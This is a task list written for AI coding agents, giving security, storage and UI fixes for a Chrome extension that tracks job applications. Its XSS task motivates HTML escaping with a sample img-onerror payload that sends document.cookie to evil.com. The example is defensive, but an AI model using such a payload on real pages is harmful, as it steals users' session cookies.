# HireTrack — Immediate Reforms
> Agent-ready pre-launch task list. Work top-to-bottom. Every task has an exact file, exact problem, and exact fix.
> Complete all items marked 🔴 and 🟠 before submitting to the Chrome Web Store.
> Version 1.0 | April 2026

---

## How to Use This File

**For AI agents (Cursor, Claude, Copilot):**
Paste this entire file into context, then say:
> "Work through every unchecked task in immediate_reforms.md from top to bottom. For each one: identify the file, make the exact change described, verify it compiles/runs, check the box, then move to the next."

Never skip a task. Never rewrite files that aren't listed. If a fix requires creating a new helper function, add it to the same file that calls it unless told otherwise.

---

## Severity Key

- 🔴 Critical — Silent data loss or complete breakage. Fix first, unconditionally.
- 🟠 High — Broken visible UI or bad first impression. Fix before publishing.
- 🟡 Medium — Functional gap users will notice. Fix in this phase.
- 🔒 Security — Exploitable vulnerability. Fix before publishing, no exceptions.
- 🔧 Prep — Not broken now, but required before building Pro. Fix in this phase.

---

## Project File Map

```
hiretrack/
├── manifest.json
├── jobDetection.js
├── background/
│   └── background.js
├── content/
│   └── content.js          ← placeholder, needs real implementation
├── popup/
│   ├── popup.html
│   ├── popup.css
│   └── popup.js
└── pipeline/
    ├── pipeline.html
    ├── pipeline.css
    └── pipeline.js
```

---

## BLOCK 1 — Critical Data & Storage Bugs 🔴

---

### TASK-01 — Move CV files from chrome.storage to IndexedDB
**File:** `popup/popup.js`
**Severity:** 🔴 Critical — Silent data loss on the 4th CV upload

**Why it breaks:** `chrome.storage.local` has a 10MB total limit. A PDF stored as base64 is 1.5–2.7MB. Three CVs fill ~8MB, leaving almost nothing. The fourth CV save silently fails with no error shown to the user.

**Step 1 — Add this IndexedDB helper block near the top of `popup.js`, before any other functions:**

```js
// ── IndexedDB for CV files ────────────────────────────────────────
function openCVDB() {
  return new Promise((resolve, reject) => {
    const req = indexedDB.open('HireTrackCVs', 1);
    req.onupgradeneeded = e => {
      e.target.result.createObjectStore('files', { keyPath: 'id' });
    };
    req.onsuccess = e => resolve(e.target.result);
    req.onerror = e => reject(e.target.error);
  });
}

async function saveCVBlob(id, blob) {
  const db = await openCVDB();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('files', 'readwrite');
    tx.objectStore('files').put({ id, blob });
    tx.oncomplete = resolve;
    tx.onerror = e => reject(e.target.error);
  });
}

async function getCVBlob(id) {
  const db = await openCVDB();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('files', 'readonly');
    const req = tx.objectStore('files').get(id);
    req.onsuccess = () => resolve(req.result?.blob || null);
    req.onerror = e => reject(e.target.error);
  });
}

async function deleteCVBlob(id) {
  const db = await openCVDB();
  return new Promise((resolve, reject) => {
    const tx = db.transaction('files', 'readwrite');
    tx.objectStore('files').delete(id);
    tx.oncomplete = resolve;
    tx.onerror = e => reject(e.target.error);
  });
}
```

**Step 2 — Replace the entire `handleCVUpload` function with this:**

```js
async function handleCVUpload(e) {
  const file = e.target.files[0];
  if (!file) return;

  const name = prompt('Label this CV (e.g. "Frontend CV", "General CV"):', file.name.replace(/\.[^.]+$/, ''));
  if (!name) return;

  const id = crypto.randomUUID();
  const blob = new Blob([await file.arrayBuffer()], { type: file.type });

  try {
    await saveCVBlob(id, blob);
    cvs.push({
      id,
      name: name.trim(),
      filename: file.name,
      uploadedAt: new Date().toISOString(),
      sizeBytes: file.size
    });
    await store.set('cvs', cvs);
    renderCVs();
  } catch (err) {
    console.error('CV upload failed:', err);
    alert('Failed to save CV. Please try again.');
  }
  e.target.value = '';
}
```

**Step 3 — Add a one-time migration function and call it in `DOMContentLoaded` before `renderAll()`:**

```js
// Migrates old base64 CVs from chrome.storage into IndexedDB.
// Runs once, then sets a flag so it never runs again.
async function migrateCVsToIndexedDB() {
  const { cvMigrated } = await new Promise(res =>
    chrome.storage.local.get('cvMigrated', res)
  );
  if (cvMigrated) return;

  const legacyCVs = cvs.filter(c => c.data);
  for (const cv of legacyCVs) {
    try {
      // Convert base64 data URL back to blob
      const res = await fetch(cv.data);
      const blob = await res.blob();
      await saveCVBlob(cv.id, blob);
      delete cv.data; // remove base64 from metadata
    } catch (err) {
      console.error('Migration failed for CV:', cv.id, err);
    }
  }

  if (legacyCVs.length > 0) {
    await store.set('cvs', cvs); // save cleaned metadata
  }
  await new Promise(res => chrome.storage.local.set({ cvMigrated: true }, res));
}
```

In `DOMContentLoaded`:
```js
// Add this line right after loading cvs and before renderAll():
await migrateCVsToIndexedDB();
```

**Step 4 — Update the CV delete handler in `renderCVs()` to also delete the blob:**

```js
// Find the existing delete handler and replace it with:
list.querySelectorAll('[data-del]').forEach(btn =>
  btn.addEventListener('click', async () => {
    const id = btn.dataset.del;
    await deleteCVBlob(id).catch(e => console.error('Blob delete failed:', e));
    cvs = cvs.filter(c => c.id !== id);
    await store.set('cvs', cvs);
    renderCVs();
  })
);
```

- [ ] Done

---

### TASK-02 — Add error handling to all chrome.storage calls
**File:** `popup/popup.js` and `pipeline/pipeline.js`
**Severity:** 🔴 Critical — Silent failures in incognito mode and at storage quota

**In `popup.js` — Replace the `store` object definition with:**

```js
store = {
  get: (key) => new Promise((resolve, reject) => {
    chrome.storage.local.get(key, (data) => {
      if (chrome.runtime.lastError) {
        console.error('Storage get failed:', chrome.runtime.lastError.message);
        reject(new Error(chrome.runtime.lastError.message));
      } else {
        resolve(data[key] || []);
      }
    });
  }),
  set: (key, val) => new Promise((resolve, reject) => {
    chrome.storage.local.set({ [key]: val }, () => {
      if (chrome.runtime.lastError) {
        console.error('Storage set failed:', chrome.runtime.lastError.message);
        showStorageError(chrome.runtime.lastError.message);
        reject(new Error(chrome.runtime.lastError.message));
      } else {
        resolve();
      }
    });
  }),
};
```

**Add this helper function to `popup.js`:**

```js
function showStorageError(detail = '') {
  const existing = document.getElementById('storage-error-toast');
  if (existing) existing.remove();

  const msg = document.createElement('div');
  msg.id = 'storage-error-toast';
  msg.textContent = 'Save failed — storage may be full or unavailable in incognito.';
  msg.style.cssText = `
    position: fixed; bottom: 10px; left: 10px; right: 10px;
    background: #c0392b; color: #fff;
    padding: 8px 12px; border-radius: 6px;
    font-size: 12px; z-index: 9999;
    font-family: -apple-system, sans-serif;
  `;
  document.body.appendChild(msg);
  setTimeout(() => msg.remove(), 4000);
}
```

**In `pipeline.js` — Replace the `persist()` function with:**

```js
async function persist() {
  return new Promise((resolve, reject) => {
    chrome.storage.local.set({ jobs }, () => {
      if (chrome.runtime.lastError) {
        console.error('Pipeline persist failed:', chrome.runtime.lastError.message);
        reject(new Error(chrome.runtime.lastError.message));
      } else {
        resolve();
      }
    });
  });
}
```

**In `pipeline.js` — Replace the `DOMContentLoaded` storage load with:**

```js
document.addEventListener('DOMContentLoaded', async () => {
  try {
    const data = await new Promise((resolve, reject) => {
      chrome.storage.local.get(['jobs', 'cvs'], (d) => {
        if (chrome.runtime.lastError) reject(new Error(chrome.runtime.lastError.message));
        else resolve(d);
      });
    });
    jobs = data.jobs || [];
    cvs  = data.cvs  || [];
  } catch (err) {
    console.error('Failed to load data:', err);
    jobs = [];
    cvs = [];
  }
  renderAll();
  bindModal();
});
```

- [ ] Done

---

## BLOCK 2 — Broken Visible UI 🟠

---

### TASK-03 — Fix Pipeline Cancel button (does nothing)
**File:** `pipeline/pipeline.js` → `bindModal()`
**Severity:** 🟠 High — Every user clicks Cancel and nothing happens

**Find the `bindModal()` function. Add this one line inside it:**

```js
document.getElementById('modal-cancel').addEventListener('click', closeModal);
```

- [ ] Done

---

### TASK-04 — Fix Pipeline modal title (always blank)
**File:** `pipeline/pipeline.js` → `openEditModal()`
**Severity:** 🟠 High — Editing modal shows blank heading on every job

**In `openEditModal()`, find the line that sets `m-title` value and add the heading update directly after the `job` lookup:**

```js
// Add this line right after: const job = jobs.find(j => j.id === id);
document.getElementById('modal-job-title').textContent = job.title;
```

- [ ] Done

---

### TASK-05 — Fix stat card colour stripes (all invisible)
**File:** `pipeline/pipeline.js` → `renderStats()`
**Severity:** 🟠 High — All five stat cards show no colour — looks unfinished

**Find the template literal that creates stat cards. Change:**

```js
// BEFORE:
`<div class="stat-card">`

// AFTER:
`<div class="stat-card" data-k="${k}">`
```

That single attribute makes the CSS selectors in `pipeline.css` work (they target `[data-k="total"]`, `[data-k="applied"]` etc).

- [ ] Done

---

### TASK-06 — Fix company name extraction
**File:** `popup/popup.js` → `extractCompany()`
**Severity:** 🟠 High — Returns "Unknown company" or the board name for most non-LinkedIn sites

**Replace the entire `extractCompany` function with:**

```js
function extractCompany(title) {
  // Strip trailing board names first so they don't get picked up as companies
  const boards = [
    'LinkedIn', 'Indeed', 'Rekrute', 'Bayt.com', 'Glassdoor', 'Glassdoor.com',
    'Emploi.ma', 'Wuzzuf', 'Akhtaboot', 'Greenhouse', 'Lever', 'Monster',
    'ZipRecruiter', 'Handshake', 'AngelList', 'Wellfound', 'Remotive',
    'We Work Remotely', 'Remote OK'
  ];
  let t = title;
  boards.forEach(b => {
    t = t.replace(new RegExp(`\\s*[|\\-\u2014]\\s*${b.replace('.', '\\.')}.*$`, 'i'), '');
  });

  // Try separator patterns in priority order
  if (t.includes(' at '))    return t.split(' at ').pop().split(/[|\-\u2014]/)[0].trim();
  if (t.includes(' chez '))  return t.split(' chez ').pop().split(/[|\-\u2014]/)[0].trim(); // French
  if (t.includes(' bei '))   return t.split(' bei ').pop().split(/[|\-\u2014]/)[0].trim();  // German
  if (t.includes(' | '))     return t.split(' | ').filter(Boolean).pop().trim();
  if (t.includes(' \u2014 ')) return t.split(' \u2014 ').filter(Boolean).pop().trim();
  if (t.includes(' - '))     return t.split(' - ').filter(Boolean).pop().trim();

  return ''; // Empty is better than "Unknown company" — user can fill it in
}
```

- [ ] Done

---

## BLOCK 3 — Security Vulnerabilities 🔒

---

### TASK-07 — Add escHtml to popup.js and apply everywhere
**File:** `popup/popup.js`
**Severity:** 🔒 Security — XSS via unsanitized user data rendered into innerHTML

**The risk:** Template names, snippet labels, job titles, and company names are inserted directly into innerHTML. A saved value like `<img src=x onerror="fetch('https://evil.com?d='+btoa(document.cookie))">` would execute.

**Step 1 — Add this function near the top of `popup.js`:**

```js
function escHtml(str = '') {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
```

**Step 2 — In `renderJobs()`, wrap every user-supplied value:**

```js
// Change every instance like:
`<div class="job-title">${j.title}</div>`
// To:
`<div class="job-title">${escHtml(j.title)}</div>`
// Same for: j.company, j.status, j.url, cv.name
```

**Step 3 — In `renderCVs()`:**
```js
`<div class="cv-name">${escHtml(c.name)}</div>`
`<div class="cv-type">${escHtml(c.filename)}</div>`
```

**Step 4 — In `renderTemplates()`:**
```js
`<div class="cv-name">${escHtml(t.name)}</div>`
`<div class="cv-type">${escHtml(t.subject)}</div>`
```

**Step 5 — In `renderSnippets()`:**
```js
`<div class="cv-name">${escHtml(s.label)}</div>`
`<div class="cv-type">${escHtml(s.content.substring(0, 40))}...</div>`
```

**Step 6 — In `openJobModal()` (the modal body innerHTML):**
Wrap `job.title`, `job.company`, `job.url`, `job.notes`, `cv.name` with `escHtml()` everywhere they appear in template literals.

- [ ] Done

---

### TASK-08 — Add Content Security Policy to manifest.json
**File:** `manifest.json`
**Severity:** 🔒 Security — Without CSP, injected scripts can run in extension pages

**Add this key to `manifest.json` (inside the root object, alongside `"name"`, `"version"`, etc.):**

```json
"content_security_policy": {
  "extension_pages": "script-src 'self'; object-src 'none'; base-uri 'none';"
}
```

This tells Chrome: only run scripts that are files within the extension itself. No inline `<script>` tags, no `eval()`, no external script URLs. If a bug causes user data to be injected as HTML, it still cannot execute code.

- [ ] Done

---

### TASK-09 — Validate messages from content.js in background/popup
**File:** `popup/popup.js` and `background/background.js`
**Severity:** 🔒 Security — Any web page can send messages to your extension via chrome.runtime.sendMessage if the extension ID is known. You must validate what arrives.

**Add this message listener to `popup.js` (inside `DOMContentLoaded`, after `bindButtons()`):**

```js
// Listen for job data extracted by content.js
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  // Only accept messages from our own content scripts (sender.tab exists for content scripts)
  if (!sender.tab) return;

  if (msg.type === 'JOB_DATA') {
    // Validate fields exist and are strings before using them
    const title   = typeof msg.title   === 'string' ? msg.title.trim().slice(0, 200)   : '';
    const company = typeof msg.company === 'string' ? msg.company.trim().slice(0, 100) : '';

    // Pre-fill the save form if data arrives (optional enhancement for content.js)
    if (title) {
      const btn = document.getElementById('save-job-btn');
      if (btn) btn.dataset.prefillTitle   = title;
      if (btn) btn.dataset.prefillCompany = company;
    }
  }
});
```

- [ ] Done

---

### TASK-10 — Trim and validate all user inputs before saving
**File:** `popup/popup.js`
**Severity:** 🔒 Security + 🟡 Quality — Prevents storing garbage data, protects against oversized inputs

**In `saveJobModal()`:**
```js
job.title   = document.getElementById('m-title').value.trim().slice(0, 200)   || job.title;
job.company = document.getElementById('m-company')?.value.trim().slice(0, 100) || job.company;
job.notes   = document.getElementById('m-notes').value.trim().slice(0, 5000);
```

**In `saveTemplate()`:**
```js
const t = {
  id: existingId || crypto.randomUUID(),
  name:    document.getElementById('t-name').value.trim().slice(0, 100),
  subject: document.getElementById('t-subject').value.trim().slice(0, 200),
  body:    document.getElementById('t-body').value.trim().slice(0, 10000),
};
if (!t.name || !t.body) { alert('Name and body are required.'); return; }
```

**In `saveSnippet()`:**
```js
const s = {
  id: existingId || crypto.randomUUID(),
  label:   document.getElementById('s-label').value.trim().slice(0, 100),
  content: document.getElementById('s-content').value.trim().slice(0, 10000),
};
if (!s.label || !s.content) { alert('Label and content are required.'); return; }
```

- [ ] Done

---

## BLOCK 4 — Missing Core Features 🟡

---

### TASK-11 — Add search and status filter to the jobs list
**File:** `popup/popup.html` and `popup/popup.js`
**Severity:** 🟡 Medium — Unusable past ~20 saved jobs

**In `popup.html`, find the Jobs tab panel (`<div id="tab-jobs">`) and add this block between the `#save-job-btn` button and the `.section-label` div:**

```html
<div style="display:flex;gap:6px;margin-bottom:8px;">
  <input
    id="job-search"
    placeholder="Search jobs..."
    style="flex:1;border:1px solid #eee;border-radius:6px;padding:6px 9px;font-size:12px;font-family:inherit;outline:none;"
  />
  <select
    id="status-filter"
    style="border:1px solid #eee;border-radius:6px;padding:6px 8px;font-size:12px;font-family:inherit;outline:none;color:#555;background:#fff;"
  >
    <option value="">All</option>
    <option value="saved">Saved</option>
    <option value="applied">Applied</option>
    <option value="interview">Interview</option>
    <option value="offer">Offer</option>
    <option value="rejected">Rejected</option>
  </select>
</div>
```

**In `popup.js`, add this helper function:**

```js
function getFilteredJobs() {
  const q = (document.getElementById('job-search')?.value || '').toLowerCase().trim();
  const s = document.getElementById('status-filter')?.value || '';
  return jobs.filter(j =>
    (!q || j.title.toLowerCase().includes(q) || j.company.toLowerCase().includes(q)) &&
    (!s || j.status === s)
  );
}
```

**In `renderJobs()`, replace the `jobs.map(...)` call with `getFilteredJobs().map(...)`.**

**In `bindButtons()`, add event listeners:**
```js
document.getElementById('job-search')
  ?.addEventListener('input', renderJobs);
document.getElementById('status-filter')
  ?.addEventListener('change', renderJobs);
```

- [ ] Done

---

### TASK-12 — Add CSV export
**File:** `popup/popup.js` and `popup/popup.html`
**Severity:** 🟡 Medium — Users have zero data recovery path without this. Export is always free per the constitution.

**Add this function to `popup.js`:**

```js
function exportJobsCSV() {
  if (!jobs.length) {
    alert('No jobs to export yet.');
    return;
  }
  const headers = ['Title', 'Company', 'Status', 'URL', 'Emailed', 'Notes', 'Saved At', 'Updated At'];
  const rows = jobs.map(j => [
    j.title,
    j.company,
    j.status,
    j.url,
    j.emailed ? 'Yes' : 'No',
    (j.notes || '').replace(/\n/g, ' ').replace(/\r/g, ''),
    j.savedAt  ? j.savedAt.slice(0, 10)  : '',
    j.updatedAt ? j.updatedAt.slice(0, 10) : ''
  ].map(v => `"${String(v || '').replace(/"/g, '""')}"`).join(','));

  const csv = '\uFEFF' + [headers.join(','), ...rows].join('\n'); // BOM for Excel compatibility
  const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement('a');
  a.href     = url;
  a.download = `hiretrack-export-${new Date().toISOString().slice(0, 10)}.csv`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}
```

**In `popup.html`, inside the Jobs tab panel, add this button below the jobs list div:**

```html
<button id="export-csv-btn" style="
  width:100%; background:none; border:0.5px solid #e8e8e8;
  border-radius:8px; padding:7px; font-size:11px; color:#888;
  cursor:pointer; font-family:inherit; margin-top:8px;">
  ↓ Export all jobs as CSV
</button>
```

**In `bindButtons()`, add:**
```js
document.getElementById('export-csv-btn')
  ?.addEventListener('click', exportJobsCSV);
```

- [ ] Done

---

### TASK-13 — Add first-run onboarding screen
**File:** `popup/popup.js` and `popup/popup.html`
**Severity:** 🟡 Medium — New users see a blank state with no explanation and uninstall

**In `popup.html`, add this element as the first child of `<body>` (before `.header`):**

```html
<div id="onboarding" style="display:none;padding:20px;">
  <div style="font-size:28px;text-align:center;margin-bottom:12px;">👋</div>
  <div style="font-weight:600;font-size:14px;margin-bottom:14px;text-align:center;">Welcome to HireTrack</div>
  <div style="font-size:12px;color:#555;line-height:1.8;margin-bottom:18px;">
    <div>📌 Browse to any job listing, open this popup, click <strong>+ Save this job</strong></div>
    <div style="margin-top:6px;">📋 Track every application on the <strong>Kanban pipeline</strong></div>
    <div style="margin-top:6px;">📁 Store your CVs so you remember which version you used</div>
    <div style="margin-top:6px;">✉️ Save email templates for follow-ups and applications</div>
    <div style="margin-top:6px;">💾 All data stays <strong>on your device</strong> — no account, no cloud</div>
  </div>
  <button id="onboarding-start" style="
    width:100%;background:#1D9E75;color:#fff;border:none;
    border-radius:8px;padding:11px;font-size:13px;font-weight:500;
    cursor:pointer;font-family:inherit;">
    Let's get started →
  </button>
</div>
<div id="main-app">
  <!-- Everything inside body EXCEPT onboarding div goes here as a wrapper -->
</div>
```

Note: Wrap all existing body content (header, tabs, content, modals) inside `<div id="main-app">`.

**In `popup.js`, in `DOMContentLoaded`, add before `renderAll()`:**

```js
// Check if first run
const { onboarded } = await new Promise(res =>
  chrome.storage.local.get('onboarded', res)
);

if (!onboarded) {
  document.getElementById('main-app').style.display = 'none';
  document.getElementById('onboarding').style.display = 'block';

  document.getElementById('onboarding-start').addEventListener('click', async () => {
    await new Promise(res => chrome.storage.local.set({ onboarded: true }, res));
    document.getElementById('onboarding').style.display = 'none';
    document.getElementById('main-app').style.display   = 'block';
  });
  return; // don't render the rest yet
}
```

- [ ] Done

---

## BLOCK 5 — content.js Implementation 🟡

---

### TASK-14 — Implement content.js DOM extraction

**File:** `content/content.js` and `manifest.json`
**Severity:** 🟡 Medium — Without this, job title and company are guessed from the tab title and wrong for most boards

**How content scripts work (plain English):**
When a user visits a supported job board (e.g. LinkedIn, Rekrute), Chrome automatically injects `content.js` into that page. The script runs inside the page's context and can read the actual HTML DOM — meaning it can find the `<h1>` that says "Senior Designer" and the element that says "Stripe". It then sends that extracted data to the popup via `chrome.runtime.sendMessage`. The popup receives it and pre-fills the title/company when saving.

```
User visits linkedin.com/jobs/view/123456
        ↓
Chrome auto-injects content.js into that page
        ↓
content.js reads <h1> = "Senior Designer", reads company name element = "Stripe"
        ↓
content.js sends: { type: 'JOB_DATA', title: 'Senior Designer', company: 'Stripe' }
        ↓
popup.js receives it (via chrome.runtime.onMessage listener added in TASK-09)
        ↓
When user clicks "+ Save this job", title and company are already filled in correctly
```

**Replace `content/content.js` entirely with:**

```js
// HireTrack — content.js
// Runs inside supported job board pages.
// Extracts job title and company from the DOM and sends to the extension.

(function () {
  'use strict';

  const host = location.hostname.replace(/^www\./, '');

  // Per-board DOM selectors. First matching selector wins.
  const EXTRACTORS = {
    'linkedin.com': {
      title:   ['h1.job-details-jobs-unified-top-card__job-title', 'h1.topcard__title'],
      company: ['.job-details-jobs-unified-top-card__company-name a', '.topcard__org-name-link', '.topcard__flavor a'],
    },
    'indeed.com': {
      title:   ['h1[data-testid="jobsearch-JobInfoHeader-title"]', 'h1.jobsearch-JobInfoHeader-title'],
      company: ['[data-testid="inlineHeader-companyName"] a', '[data-testid="inlineHeader-companyName"]'],
    },
    'greenhouse.io': {
      title:   ['h1.app-title', '.posting-headline h2'],
      company: ['.company-name', '.posting-headline .sort-by-time'],
    },
    'lever.co': {
      title:   ['.posting-headline h2', 'h2.posting-name'],
      company: ['.main-header-text .large-category-label', '.posting-categories .sort-by-time'],
    },
    'glassdoor.com': {
      title:   ['[data-test="job-title"]', 'h1.job-title'],
      company: ['[data-test="employer-name"]', '.employer-name'],
    },
    'rekrute.com': {
      title:   ['h1.job_title', '.bloc-offre-title h1', 'h1'],
      company: ['.recruiter-name a', '.company-name', '.recruiter-name'],
    },
    'bayt.com': {
      title:   ['h1.jb-job-title', 'h1[class*="job-title"]', 'h1'],
      company: ['.jb-company-name a', '.company-name a', '[class*="company"] a'],
    },
    'wuzzuf.net': {
      title:   ['h1.css-f5jndf', 'h1[class*="title"]', 'h1'],
      company: ['a[class*="css-17s97q8"]', 'a[class*="company"]'],
    },
    'akhtaboot.com': {
      title:   ['.job-title h1', 'h1'],
      company: ['.company-info .company-name', '.job-company'],
    },
    'emploi.ma': {
      title:   ['.job-header h1', 'h1.job-title', 'h1'],
      company: ['.company-name', '.employer-name'],
    },
    'myworkday.com': {
      title:   ['h2[data-automation-id="jobPostingHeader"]', 'h1'],
      company: [],  // company is typically in the subdomain (e.g. stripe.wd1.myworkday.com)
    },
    'boards.greenhouse.io': {
      title:   ['h1.job-post__title', 'h1'],
      company: ['a.job-post__company-name'],
    },
    'jobs.lever.co': {
      title:   ['.posting-headline h2'],
      company: ['.main-header-text .sort-by-time'],
    },
    'ashbyhq.com': {
      title:   ['h1[class*="jobTitle"]', 'h1'],
      company: ['[class*="companyName"]'],
    },
  };

  function findText(selectors) {
    for (const sel of selectors) {
      const el = document.querySelector(sel);
      if (el?.innerText?.trim()) return el.innerText.trim().replace(/\s+/g, ' ');
    }
    return '';
  }

  function findExtractor() {
    for (const [domain, config] of Object.entries(EXTRACTORS)) {
      if (host.includes(domain)) return config;
    }
    return null;
  }

  function tryExtract() {
    const extractor = findExtractor();
    if (!extractor) return;

    const title   = findText(extractor.title   || []).slice(0, 200);
    const company = findText(extractor.company || []).slice(0, 100);

    if (title || company) {
      chrome.runtime.sendMessage({
        type:    'JOB_DATA',
        title:   title,
        company: company,
        url:     location.href
      });
    }
  }

  // Try immediately (most pages are already loaded when content script runs)
  tryExtract();

  // Also try after a short delay for SPAs (React/Vue pages that render after JS runs)
  setTimeout(tryExtract, 1500);

  // Watch for DOM changes (for single-page apps that navigate without full reload)
  let lastUrl = location.href;
  const observer = new MutationObserver(() => {
    if (location.href !== lastUrl) {
      lastUrl = location.href;
      setTimeout(tryExtract, 1000); // wait for new page content to load
    }
  });
  observer.observe(document.body, { childList: true, subtree: true });

})();
```

**Update `manifest.json` — replace the `content_scripts` entry with:**

```json
"content_scripts": [
  {
    "matches": [
      "*://*.linkedin.com/jobs/*",
      "*://*.indeed.com/viewjob*",
      "*://*.indeed.com/job/*",
      "*://*.greenhouse.io/*",
      "*://*.lever.co/*",
      "*://*.glassdoor.com/job-listing/*",
      "*://*.glassdoor.com/Jobs/*",
      "*://*.rekrute.com/*",
      "*://*.bayt.com/en/*",
      "*://*.wuzzuf.net/jobs/*",
      "*://*.akhtaboot.com/*",
      "*://*.emploi.ma/*",
      "*://*.myworkday.com/*/job/*",
      "*://boards.greenhouse.io/*",
      "*://jobs.lever.co/*",
      "*://*.ashbyhq.com/*"
    ],
    "js": ["content/content.js"],
    "run_at": "document_idle"
  }
]
```

Note: `"run_at": "document_idle"` means the script runs after the page has mostly loaded — better for SPAs than `document_start`.

**How popup.js uses this data (connects to TASK-09):**
In `saveCurrentJob()`, check if pre-fill data was stored by the message listener before falling back to title parsing:

```js
async function saveCurrentJob() {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });

  const exists = jobs.find(j => j.url === tab.url);
  if (exists) { flashButton('save-job-btn', 'Already saved ✓', '#888'); return; }

  const check = isLikelyJobPage(tab.url, tab.title);
  if (!check.ok) { flashButton('save-job-btn', 'Not a job page', '#c0392b'); return; }
  if (check.warning) {
    const go = confirm('This page might not be a job listing. Save anyway?');
    if (!go) return;
  }

  // Use content.js extracted data if available, fall back to tab title parsing
  const btn = document.getElementById('save-job-btn');
  const prefillTitle   = btn?.dataset.prefillTitle   || '';
  const prefillCompany = btn?.dataset.prefillCompany || '';

  const rawTitle = tab.title.split(' - ')[0].split(' | ')[0].trim() || 'Untitled Job';

  const job = {
    id:        crypto.randomUUID(),
    title:     (prefillTitle   || rawTitle).slice(0, 200),
    company:   (prefillCompany || extractCompany(tab.title)).slice(0, 100),
    url:       tab.url,
    status:    'saved',
    cvId:      null,
    emailed:   false,
    notes:     '',
    savedAt:   new Date().toISOString(),
    syncedAt:  null,
    remindAt:  null,
  };

  jobs.unshift(job);
  await store.set('jobs', jobs);
  flashButton('save-job-btn', 'Saved ✓', '#1D9E75');
  renderJobs();
  document.getElementById('job-count').textContent = `${jobs.length} job${jobs.length !== 1 ? 's' : ''} saved`;

  // Clear prefill data after use
  if (btn) { delete btn.dataset.prefillTitle; delete btn.dataset.prefillCompany; }
}
```

- [ ] Done

---

## BLOCK 6 — Pre-Pro Preparation 🔧

---

### TASK-15 — Switch all new job IDs to crypto.randomUUID()
**File:** `popup/popup.js`
**Severity:** 🔧 Prep — Required before cloud sync. `Date.now()` IDs collide across devices.

**In `saveCurrentJob()`, change:**
```js
// BEFORE:
id: Date.now().toString(),

// AFTER:
id: crypto.randomUUID(),
```

**In `saveTemplate()`:**
```js
id: existingId || crypto.randomUUID(),
```

**In `saveSnippet()`:**
```js
id: existingId || crypto.randomUUID(),
```

`crypto.randomUUID()` is available in Chrome extension contexts with no extra library. No import needed.

- [ ] Done

---

### TASK-16 — Add syncedAt and remindAt to the job model
**File:** `popup/popup.js` → `saveCurrentJob()`
**Severity:** 🔧 Prep — Required before building cloud sync and reminders. Adding now costs nothing and avoids a migration later.

**In the job object created in `saveCurrentJob()`, ensure these fields exist:**

```js
const job = {
  // ...existing fields...
  syncedAt:  null,   // ISO string — set when synced to cloud (Pro only). null = not synced.
  remindAt:  null,   // ISO string — follow-up reminder date (Pro only). null = no reminder.
};
```

No other changes needed. Free users leave these null. Pro features write to them.

- [ ] Done

---

### TASK-17 — Add planCache to chrome.storage (stub)
**File:** `popup/popup.js`
**Severity:** 🔧 Prep — Required before Pro launch. Prevents a network call on every popup open.

**Add this helper function to `popup.js`:**

```js
// Pro will call setPlanCache() after login.
// Free tier reads it and gets { plan: 'free' } back.
async function getPlanCache() {
  const { planCache } = await new Promise(res =>
    chrome.storage.local.get('planCache', res)
  );
  return planCache || { plan: 'free', validUntil: null, cachedAt: null };
}

async function setPlanCache(plan, validUntil) {
  await new Promise(res =>
    chrome.storage.local.set({
      planCache: { plan, validUntil, cachedAt: new Date().toISOString() }
    }, res)
  );
}
```

These functions exist but do nothing in the free tier. Pro feature code will call them.

- [ ] Done

---

## BLOCK 7 — Final Pre-Launch Checklist

Before submitting to the Chrome Web Store, verify all of the following:

### Code Quality
- [ ] All 🔴 tasks complete (TASK-01 through TASK-02)
- [ ] All 🟠 tasks complete (TASK-03 through TASK-06)
- [ ] All 🔒 tasks complete (TASK-07 through TASK-10)
- [ ] All 🟡 tasks complete (TASK-11 through TASK-14)
- [ ] All 🔧 tasks complete (TASK-15 through TASK-17)

### Minification (required for Web Store submission)
Run through Terser before submitting. Terser is free and available as a CLI tool:
```bash
npm install -g terser
terser popup/popup.js     -o popup/popup.min.js     --compress --mangle
terser pipeline/pipeline.js -o pipeline/pipeline.min.js --compress --mangle
terser jobDetection.js    -o jobDetection.min.js    --compress --mangle
terser content/content.js -o content/content.min.js --compress --mangle
```
Update HTML files to reference `.min.js` versions before zipping for submission.
Keep the un-minified source in the GitHub repo. The minified version goes in the Web Store ZIP only.

### Legal / Store Requirements
- [ ] Privacy policy written (one paragraph is sufficient) — host on GitHub Pages
- [ ] Chrome Web Store listing written with screenshots
- [ ] Each manifest permission explained in the Store listing (required by Chrome policy):
  - `storage` — saves your jobs, CVs, and templates locally on your device
  - `activeTab` — reads the URL and title of the current tab when you click Save
  - `scripting` — (reserved, not actively used in free tier)
  - `tabs` — opens the pipeline view and job URLs in new tabs
  - `alarms` — fires follow-up reminder notifications at the date you set
- [ ] GitHub repo created with BSL 1.1 license file and README
- [ ] Confirm extension name "HireTrack" is not trademarked (search WIPO at wipogold.wipo.int)

### Manual Testing Before Submission
- [ ] Install the unpacked extension in Chrome
- [ ] First run: onboarding screen appears, works, doesn't show again
- [ ] Visit LinkedIn job listing: content.js extracts title and company correctly
- [ ] Visit Rekrute.com job listing: content.js extracts title and company
- [ ] Click "+ Save this job" on a non-job page: shows "Not a job page" flash
- [ ] Upload 3 CVs: all succeed and appear in the list
- [ ] Upload 4th CV: succeeds (IndexedDB, no longer limited)
- [ ] Open Pipeline: stat colours show, Kanban renders, drag works
- [ ] Edit a job in Pipeline: modal title shows the job name, Cancel closes it
- [ ] Export CSV: downloads a valid file, opens correctly in Excel/Sheets
- [ ] Try saving a job in an incognito window: shows a clear error message, does not crash

---

## Notes for AI Agents

1. **Do not modify `jobDetection.js`** — it is complete and correct as written. Do not touch it.
2. **Do not modify `pipeline.css` or `popup.css`** unless a task explicitly says so.
3. **`constitution.md` is read-only reference** — it describes the target product. Do not implement anything from it that isn't listed in this file.
4. **Task order matters** — TASK-01 must come before TASK-14 because TASK-14 references the CV blob functions added in TASK-01. Work sequentially.
